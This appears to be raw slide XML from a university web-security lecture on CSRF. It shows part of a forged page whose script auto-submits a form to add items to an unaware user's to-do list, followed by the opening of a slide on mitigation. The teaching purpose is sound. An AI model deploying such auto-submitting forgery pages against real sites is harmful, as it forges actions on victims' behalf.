            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/form&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905" marR="4143375" indent="-251460">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>document.getElementById(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).click();</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="180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</a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>26</a:t>
            </a:fld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170"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ATTACK:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EXAMPLE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="275"/>
              <a:t>ON</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="495"/>
              <a:t>TO-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="165"/>
              <a:t>DO</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-285"/>
              <a:t>LIST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962050" y="1533220"/>
            <a:ext cx="7419340" cy="3522345"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="295275" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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95">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>To-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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List</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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built</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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using</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-11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CSRF!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="346710" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="994"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Let’s</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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create</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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page</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>that </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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add</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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arbitrary</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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items</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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list</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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unaware</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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user!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="990"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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lecturer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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able</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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hack</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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sophisticated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	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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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95">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>To-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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List</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App?</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Live</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>demo</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-65" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>time!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8706167" y="1555622"/>
            <a:ext cx="2613025" cy="4631055"/>
            <a:chOff x="8706167" y="1555622"/>
            <a:chExt cx="2613025" cy="4631055"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="object 5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715756" y="1565147"/>
              <a:ext cx="2593848" cy="4611624"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="object 6" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8710930" y="1560385"/>
              <a:ext cx="2603500" cy="4621530"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2603500" h="4621530">
                  <a:moveTo>
                    <a:pt x="0" y="4621149"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2603373" y="4621149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2603373" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4621149"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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" name="object 7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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8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dirty="0" spc="-25"/>
              <a:t>26</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>26</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="6366510" cy="57404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45"/>
              <a:t>MITIGATING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-150"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-165"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>ATTACKS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962050" y="1533220"/>
            <a:ext cx="10166985" cy="4323715"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="96520" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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best</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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way</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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mitigate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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use</a:t>
            </a:r>
